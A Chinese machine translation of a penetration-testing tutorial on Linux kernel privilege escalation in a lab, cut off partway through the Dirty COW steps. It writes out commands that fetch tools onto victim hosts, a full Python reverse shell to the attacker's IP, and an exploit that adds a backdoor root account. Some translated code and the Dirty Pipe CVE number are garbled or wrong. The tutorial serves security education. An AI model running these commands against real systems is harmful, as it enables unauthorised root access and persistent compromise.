<html>
<head>
<title>Linux Privilege Escalation: Linux kernel / distribution exploits you should know about.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Linux权限提升:您应该知道的Linux内核/发行版漏洞。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/linux-privilege-escalation-linux-kernel-distribution-exploits-you-should-now-about-1c46152d133d?source=collection_archive---------2-----------------------#2022-09-17">https://infosecwriteups.com/linux-privilege-escalation-linux-kernel-distribution-exploits-you-should-now-about-1c46152d133d?source=collection_archive---------2-----------------------#2022-09-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="3e1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章将向你展示如何扫描你的系统，寻找潜在的内核/发行版漏洞。</p><p id="d919" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，我将向您展示几个您应该知道的著名的linux内核特权提升漏洞。</p><p id="9923" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">免责声明<br/> </strong>本文仅用于信息和教育目的，并面向那些愿意并好奇了解安全性和渗透测试的人。内容不得用于非法目的。如果你准备好学习新的好东西，那么继续读下去。</p><p id="f6d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">详情<br/> </strong>这些年来，很多内核漏洞都变得可用。然而，有几个工作在各种各样的发行版上。在本文中，我们将仔细研究与大多数Linux发行版重叠的三个漏洞。其中包括Dirty Cow(内核版本2.2到3.9)、pol kit(2009年以来的所有Linux发行版，包括pkexec)、Dirty Pipe(内核版本5.8到5.10)。</p><p id="1427" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以利用内核漏洞来执行权限提升。但是，只有在万不得已的情况下才这样做。内核漏洞可能表现得不可预测，并可能破坏目标系统的稳定。</p><p id="be6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用特定Linux内核或发行版漏洞的能力取决于以下因素:<br/> -现有内核版本<br/> -发行版中存在的组件</p><p id="938c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一个重要的方面是编译。如果可能，总是在目标系统上编译您的漏洞。如果没有可用的编译器，可以在攻击者的机器上编译该漏洞并将其复制到目标系统。</p><p id="9b54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">POC由多台Linux机器(我们的受害者)和一台攻击者机器(Kali Linux 2022.3版本)组成。</p><p id="0099" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者01(脏牛)<br/> -元可移植(x86) <br/> - IP地址:192.168.62.162 <br/> -内核版本:2 . 6 . 24–16</p><p id="6416" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者02(pol kit)<br/>-Ubuntu 16.04(x64)<br/>-IP地址:192.168.62.177 <br/> -内核版本:4 . 4 . 0–21-通用</p><p id="cc9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者03(脏管道)<br/> - Kali Linux (x86) <br/> - IP地址:192.168.62.171 <br/> -内核版本:5.10–40</p><p id="f8dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者(用于反向外壳)<br/> - Kali Linux <br/> - IP地址:192.168.62.161</p><p id="69c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">初始立足点:<br/>我们的初始立足点由一个标准(反向)外壳组成。被利用的用户没有sudo权限。</p><p id="e16f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来的部分包括:<br/> -步骤1–5:Linux-exploit-suggest er . sh<br/>-步骤6–7:手动枚举<br/> -步骤8–20脏牛(CVE 2016–5195)<br/>-步骤21–28:波尔基特(CVE-2021–4034)<br/>-步骤29–34:脏管道(CVE 2022–0867)<br/>-学分</p><p id="1ff7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">枚举方式<br/> </strong>内核漏洞枚举可以手动完成，也可以自动完成。最好的脚本之一是“Linux-exploit-suggester . sh”(2022年9月16日最新版本:2022年4月1日)。我建议同时进行手动和自动枚举。</p><p id="22df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Linux-exploit-suggest er . sh<br/></strong>不幸的是，这个脚本无法在内核版本低于4.0的系统上运行。首先，我们需要修改脚本，以便它也能在旧系统上工作。</p><p id="80e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="5c27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">打开一个新的终端选项卡，并启动一个临时HTTP web服务器。我们将在整个开发过程中使用该服务器。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="5c76" class="ku kv iq kq b gy kw kx l ky kz">python3 -m http.server 80 --directory /tmp</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi la"><img src="../Images/86d45980ad9f3b98335fad2df3dc6b35.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*Qdj3M-W_T1HQ_IXlClDXow.png"/></div></figure><p id="a209" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="322f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载linux-exploit-suggester.sh</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="f424" class="ku kv iq kq b gy kw kx l ky kz">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/linux-exploit-suggester.sh --no-verbose</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi le"><img src="../Images/71a7c724e669089595d573870d3f5d80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VBr9QK0KV4donnwWuQp9cw.png"/></div></div></figure><p id="e83b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="4897" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">调整漏洞，使其与旧系统兼容</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="a615" class="ku kv iq kq b gy kw kx l ky kz">nano /tmp/linux-exploit-suggester.sh</span></pre><p id="999d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">CTRL + W &gt;搜索“版本4.0”</p><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/f49d88ea73c6956848ac5ea0037703b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*jZzgm70FdGYvD6UFmVHF6Q.png"/></div></figure><p id="1d52" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">原始代码:</p><blockquote class="lk ll lm"><p id="080c" class="jn jo ln jp b jq jr js jt ju jv jw jx lo jz ka kb lp kd ke kf lq kh ki kj kk ij bi translated">if((BASH _ versi info[0]&lt; 4)); then</p></blockquote><p id="66dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Adjusted code:</p><blockquote class="lk ll lm"><p id="7610" class="jn jo ln jp b jq jr js jt ju jv jw jx lo jz ka kb lp kd ke kf lq kh ki kj kk ij bi translated">if ((BASH_VERSINFO[0] &lt; 1)); then</p></blockquote><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi lr"><img src="../Images/245f6f81105cf80c0a05c28792b39c37.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*nXTkWuD1v7Vn24UHPwYNtQ.png"/></div></figure><p id="0b58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Save the adjusted script.<br/>CTRL+O，CTRL+X</p><p id="ed40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.在192.168.62.162上执行(受害者机器，Metasploitable)。</p><p id="b3cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用wget从Kali机器下载脚本linux-exploit-suggester.sh。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="1a1f" class="ku kv iq kq b gy kw kx l ky kz">LHOST=192.168.62.161<br/>LPORT=80<br/>file=linux-exploit-suggester.sh<br/>wget http://${LHOST}:${LPORT}/${file} -O /tmp/${file}; chmod 755 /tmp/${file}</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi ls"><img src="../Images/4ccc6137fa9d4252ccffab9c83dd41e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1244/format:webp/1*7E6TluRhsJ1vSu4ILYpeuQ.png"/></div></figure><p id="3f9a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可选:<br/>如果wget在目标系统上不可用，您也可以使用curl或python来执行下载。</p><p id="b17d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用curl从Kali机器上下载脚本linux-exploit-suggester.sh。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="a1ba" class="ku kv iq kq b gy kw kx l ky kz">LHOST=192.168.62.161<br/>LPORT=80<br/>file=linux-exploit-suggester.sh<br/>curl -s http://${LHOST}:${LPORT}/${file} -o /tmp/${file}; chmod 755 /tmp/${file}; ls -l /tmp/${file};</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lt"><img src="../Images/1b0e0648b19b3d51332cb55b8b1203c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rXT6o6MGqwwWnoasQPWl8g.png"/></div></div></figure><p id="2b31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用python2从Kali机器下载脚本linux-exploit-suggester.sh。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="685a" class="ku kv iq kq b gy kw kx l ky kz">LHOST=192.168.62.161<br/>LPORT=80<br/>file=linux-exploit-suggester.sh<br/>python -c "import urllib2; u = urllib2.urlopen('http://${LHOST}:${LPORT}/${file}'); localFile = open('/tmp/${file}', 'w'); localFile.write(u.read()); localFile.close()"; chmod 755 /tmp/${file}; ls -l /tmp/${file};</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/3eaae1820588f32008f6feb0a7682fa8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*uxXsS1JK8ya9_n9kjjOgSg.png"/></div></figure><p id="0f6e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的目标系统仅支持python3，您可以使用python3请求模块下载python3漏洞。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="b0ee" class="ku kv iq kq b gy kw kx l ky kz">LHOST=192.168.62.161<br/>LPORT=80<br/>file=linux-exploit-suggester.sh<br/>python3 -c "import requests; url = 'http://${LHOST}:${LPORT}/${file}'; myfile = requests.get(url); open('/tmp/${file}', 'wb').write(myfile.content)"; chmod 755 /tmp/${file}</span></pre><p id="477a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.在192.168.62.162上执行(受害者机器，Metasploitable)。</p><p id="690b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行linux-exploit-suggester.sh</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="a4bb" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>./linux-exploit-suggester.sh</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi le"><img src="../Images/ee3af2dccce4b953acad0ca582d361e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uHppS-5P7pBH-_XtfM64UQ.png"/></div></div></figure><p id="382f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Metasploitable上，我们有79个可能的内核漏洞。其中两个“可能”正在攻击目标。</p><p id="d9df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">手动枚举</strong></p><p id="83ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不要仅仅依赖自动枚举脚本。如前所述，你受制于你的脚本的质量，所以我建议做一个手动检查。</p><p id="15d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.执行于192.168.62.177(受害者机器，Ubuntu 16.04)。</p><p id="9746" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查当前的架构、发行版和内核版本。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="1dab" class="ku kv iq kq b gy kw kx l ky kz">arch;<br/>cat /etc/issue;<br/>uname -r;</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lv"><img src="../Images/610d02f73e12ba0dac8d54a47b729f26.png" data-original-src="https://miro.medium.com/v2/resize:fit:892/format:webp/1*Hn-GKN8psWZ_CHYkXH_q1w.png"/></div></div></figure><p id="e91d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="f07b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用searchsploit工具查找可能的内核漏洞。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="617a" class="ku kv iq kq b gy kw kx l ky kz"># update to the latest version<br/>sudo apt update &amp;&amp; sudo apt install exploitdb</span><span id="a2a0" class="ku kv iq kq b gy lw kx l ky kz"># search for kernel exploits on the target system<br/>searchsploit linux kernel ubuntu 16.04</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/a09f23c056cf993313fb583084cec2fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f6qu2AhR5iXVZw8yXyn5ng.png"/></div></div></figure><p id="5f9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Dirty COW(CVE 2016–5195)<br/></strong>Dirty COW(Dirty copy-on-write)是Linux内核漏洞，影响内核版本2.2到3.9的系统。菲尔·奥斯特(Phil Oester)在2016年发现了这个漏洞。</p><p id="5829" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">背景信息:<a class="ae ly" href="https://dirtycow.ninja." rel="noopener ugc nofollow" target="_blank">https://dirty cow . ninja .</a><br/>易受攻击的内核版本:2.2–3.9</p><p id="5d3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将使用metasploitable(内核2.4)机器来利用这个漏洞。我的建议是在目标机器上设置两个独立的反向shells来运行这个漏洞。这样，在攻击正在执行或攻击失败时，与目标机器的连接将保持不变。我们还将添加一个后门帐户，这样即使在漏洞被执行后，也可以保持根用户访问。</p><p id="bd97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">受害者01 (Ditry Cow) <br/> -元可移植(x86) <br/> - IP地址:192.168.62.162 <br/> -内核版本:2 . 6 . 24–16</p><p id="feec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="440f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载恶意利用</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="32e5" class="ku kv iq kq b gy kw kx l ky kz">file=dirty<br/>wget <a class="ae ly" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/${file}.c" rel="noopener ugc nofollow" target="_blank">https://raw.githubusercontent.com/FireFart/dirtycow/master/${file}.c</a> -O /tmp/${file}.c</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/5c801bf6198e1929c369b485b1b88cf4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rav_YvzPzwmUNvqQR_uGLg.png"/></div></div></figure><p id="1996" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">9.可选项:在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="b291" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译肮脏的利用(对卡利)。仅当漏洞无法在本地编译时才执行此步骤。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="335d" class="ku kv iq kq b gy kw kx l ky kz">file=dirty<br/>gcc -pthread -o /tmp/${file}_x64 /tmp/${file}.c -lcrypt</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi lz"><img src="../Images/2f1f4e0e8b2070bb6356267588c40f4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:992/format:webp/1*fX-qnOneYQ8NAe7q8LZuQg.png"/></div></figure><p id="c254" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">遗憾的是，无法在Kali上为x86系统编译此漏洞。但是你可以在32位的Ubuntu架构上编译它。</p><p id="4be0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">10.在192.168.62.161上执行(攻击者机器，Kali Linux)。</p><p id="e8a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为第二个反向shell启动一个netcat监听器。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="5f6a" class="ku kv iq kq b gy kw kx l ky kz">rlwrap nc -nlvp 443</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/09c57b2c5405ccde5bd1e2b333ed7320.png" data-original-src="https://miro.medium.com/v2/resize:fit:436/format:webp/1*KLGQV3s_BPUFgPQPtV4jwQ.png"/></div></figure><p id="5082" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">11.在192.168.62.162上执行(受害者机器，Metasploitable)。</p><p id="8ad5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用我们的目标机器设置第二个反向外壳。我们将使用python2反向外壳。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="23e0" class="ku kv iq kq b gy kw kx l ky kz">vulnscript=/tmp/rev-shell.sh<br/>LHOST=192.168.62.161<br/>LPORT=443<br/>echo """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""" &gt;$vulnscript<br/>chmod 755 /tmp/rev-shell.sh<br/>cd /tmp<br/>./rev-shell.sh &amp;</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/8ccbb7e12648c973b42fdb62328fc2f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YLO2u7nH99Sesel2gpE6pQ.png"/></div></div></figure><p id="7d01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的Kali机器上:</p><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mb"><img src="../Images/5ca5777fb2caab6ce6cb68e7c9b6cfb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1072/format:webp/1*BZCo_Q1o9UYqQOWX_qCtQQ.png"/></div></figure><p id="9a68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">12.在192.168.62.162上执行(受害者机器，Metasploitable第二个反向外壳)。</p><p id="211b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将第二个shell升级为交互式Bash shell。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="0593" class="ku kv iq kq b gy kw kx l ky kz">python -c "import pty; pty.spawn('/bin/bash')"</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/1c2c5860e11c1b54cd76ad5caf197861.png" data-original-src="https://miro.medium.com/v2/resize:fit:752/format:webp/1*rChCxl_bXsfDc30eOKRbSQ.png"/></div></figure><p id="b7ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">13.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="76aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从Kali下载漏洞利用源代码</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="047c" class="ku kv iq kq b gy kw kx l ky kz">file=dirty<br/>LHOST=192.168.62.161<br/>LPORT=80<br/>files="${file}.c ${file}_x64"<br/>for file in $(echo $files); do wget http://${LHOST}:${LPORT}/${file} -O /tmp/${file}; chmod 755 /tmp/${file}; done</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gh gi lx"><img src="../Images/1b5e4c0662533621a5e3ac2d6791043c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q3NzVnUHlOgOHp1vClXcvA.png"/></div></div></figure><p id="8f41" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">14.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="26b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编译漏洞</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="7fed" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>gcc -pthread dirty.c -o dirty -lcrypt<br/>chmod 755 dirty</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi md"><img src="../Images/ab4c287963de425e24e6ec13350578c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*gBH8DzuisipX_K6fZ_pp9Q.png"/></div></figure><p id="5a01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">15.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="b993" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将原来的/etc/passwd复制到/tmp</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="dda9" class="ku kv iq kq b gy kw kx l ky kz">cp /etc/passwd /tmp</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi la"><img src="../Images/daeab77df87302797e69aa5609741653.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*PdQ7YWR7w08sX3aIhh75Aw.png"/></div></figure><p id="1f8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">16.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="04be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果尚未升级，请将当前shell升级到交互式shell。</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="a06a" class="ku kv iq kq b gy kw kx l ky kz">python -c 'import pty; pty.spawn("/bin/sh")'</span></pre><p id="0f89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行攻击(总共需要大约1-3分钟)</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="5451" class="ku kv iq kq b gy kw kx l ky kz">cd /tmp<br/>./dirty</span></pre><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/69287f4bd3cf0e0d44f3c4fbe1aa53a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*xG-vXS0Eow1x-suguhK-ZQ.png"/></div></figure><p id="599c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">出现密码问题时按ENTER键(空白密码)</p><p id="db8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等待大约2/3分钟，等待攻击完成。</p><figure class="kl km kn ko gt lb gh gi paragraph-image"><div class="gh gi me"><img src="../Images/4da750cba576406de21f89271355c758.png" data-original-src="https://miro.medium.com/v2/resize:fit:1016/format:webp/1*ml7K2NYpc2wYnVGVLBvMmw.png"/></div></figure><p id="0c8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该漏洞利用成功执行。我们可以切换到根用户“firefart”。</p><p id="561f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">17.在192.168.62.162上执行(受害机器，Metasploitable第一个反向外壳)。</p><p id="8fe5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到用户firefart(无密码)</p><pre class="kl km kn ko gt kp kq kr ks aw kt bi"><span id="f8ab" class="ku kv iq kq b gy kw kx l ky kz">su 